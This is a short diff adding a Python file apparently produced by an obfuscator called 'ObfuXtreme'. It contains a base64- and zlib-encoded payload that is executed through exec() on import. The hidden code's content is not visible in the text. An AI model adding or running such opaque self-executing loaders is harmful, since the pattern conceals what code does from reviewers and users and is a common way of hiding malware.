@@ -1,0 +1,4 @@
+# ObfuXtreme v1
+__obfuxtreme__ = '1'
+# ObfuXtreme-runtime-payload-base64: eNpLSU1TSElNztdIzinWtOJSAAIgSw8kVJRYkpqiYKsQUlSaCpYoSi0pLcoDyXNxOYBUcCXnJBYXKzjlV0B0pgANi4/PzMssiY/XKE7NSdNRKIMaCgIgEb0yoIllXACFYiLt
+exec(__import__('zlib').decompress(__import__('base64').b64decode(b'eNpLSU1TSElNztdIzinWtOJSAAIgSw8kVJRYkpqiYKsQUlSaCpYoSi0pLcoDyXNxOYBUcCXnJBYXKzjlV0B0pgANi4/PzMssiY/XKE7NSdNRKIMaCgIgEb0yoIllXACFYiLt')))
